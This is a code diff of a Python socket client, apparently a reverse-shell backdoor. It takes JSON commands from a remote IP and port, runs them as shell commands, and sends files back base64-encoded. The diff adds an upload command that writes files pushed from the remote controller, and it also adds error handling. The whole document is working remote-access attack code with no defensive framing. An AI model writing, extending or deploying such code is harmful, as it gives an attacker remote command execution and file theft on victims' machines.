@@ -1,7 +1,9 @@
 import socket
 import subprocess
-import json
+#import json
 import os
+import base64
+import simplejson
 
 class Socket:
 	def __init__(self, ip, port):
@@ -15,8 +17,8 @@ class Socket:
 #Connection.send('Connection Successful\n')
 
 	def json_send(self, data):
-		json_data = json_dumps(data)
-		self.Connection.send(json_data)
+		json_data = simplejson.dumps(data)
+		self.Connection.send(json_data.encode('utf-8'))
 
 
 	def json_receive(self):
@@ -24,8 +26,8 @@ class Socket:
 
 		while True:
 			try:
-				json_data = json_data + self.Connection.recv(1024)
-				return json.loads(json_data)
+				json_data = json_data + self.Connection.recv(1024).decode()
+				return simplejson.loads(json_data)
 			except ValueError:
 				continue
 
@@ -35,22 +37,32 @@ class Socket:
 
  	def read_file_contents(self, path):
  		with open(path,'rb') as my_file:
- 			return my_file.read()
+ 			return base64.b64encode(my_file.read())
+
+ 	def save_file(self, path, content):
+ 		with open(path,'wb') as my_file:
+ 			my_file.write(base64.b64decode(content))
+ 			return 'Download Successful'
 
 	def start_socket(self):
 		while True:
 
 			command = self.json_receive()
-			if command[0] == 'quit':
-				self.Connection.close()
-				exit()
-			elif command[0] == 'cd' and len(command) > 1:
-				command_output = self.execute_cd_command(command[1])
-			elif command[0] == 'download':
-				command_output = self.read_file_contents(command[1])
-			else:
-				command_output = self.command_execution(command)
-
+			try:
+				if command[0] == 'quit':
+					self.Connection.close()
+					exit()
+				elif command[0] == 'cd' and len(command) > 1:
+					command_output = self.execute_cd_command(command[1])
+				elif command[0] == 'download':
+					command_output = self.read_file_contents(command[1])
+				elif command[0] == 'upload':
+					command_output = self.save_file(command[1],command[2])
+				else:
+					command_output = self.command_execution(command)
+				
+			except Exception:
+				command_output = 'Error!'
 			self.json_send(command_output)
 
 		self.Connection.close()
